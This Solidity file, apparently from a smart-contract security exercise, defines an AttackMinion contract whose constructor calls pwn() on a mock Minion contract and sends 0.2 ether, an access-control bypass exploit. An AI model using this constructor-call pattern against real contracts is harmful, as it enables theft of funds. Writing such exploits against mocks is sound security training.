// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "./MockAccessControl.sol";

contract AttackMinion {
    constructor( address _minionAddress) payable{
            Minion(_minionAddress).pwn{value: 1 ether/5}();
    }

    receive() payable external{}
}